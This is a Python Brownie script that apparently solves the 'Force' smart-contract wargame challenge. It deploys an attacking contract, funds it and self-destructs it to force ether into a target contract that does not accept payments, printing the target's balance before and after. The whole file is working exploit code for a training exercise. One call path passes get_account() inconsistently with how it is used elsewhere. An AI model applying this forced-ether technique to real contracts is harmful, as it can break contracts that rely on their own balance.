#!/usr/bin/python3
from brownie import AttackForce, Force
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

# * Rinkeby address: 0x727AA67AE34314B627895c2028565155E2fB6B43


def force(contract_address=None, attacker=None):
    if not contract_address:
        force_contract, _ = deploy()
        _, attacker = get_account()
    else:
        force_contract = Force.at(contract_address)

    # * deploy the malicious contract
    attacking_force = AttackForce.deploy({"from": attacker})

    # * balance of the contract before attack
    print(f"{green}Balance before the attack: {red}{force_contract.balance()}{reset}")

    # * send money to the contract
    print(f"{red}Sending monery to our malicious contract{reset}")
    attacker.transfer(to=attacking_force.address, amount="0.0001 ether")

    # * destroy our malicious contract & send the money to the target contract
    attacking_force.destroy(force_contract.address, {"from": attacker})
    print(f"{green}Balance of the contract: {red}{force_contract.balance()}{reset}")


def main(contract_address=None):
    if contract_address:
        force(contract_address, get_account())
    else:
        force()


if __name__ == "__main__":
    main()
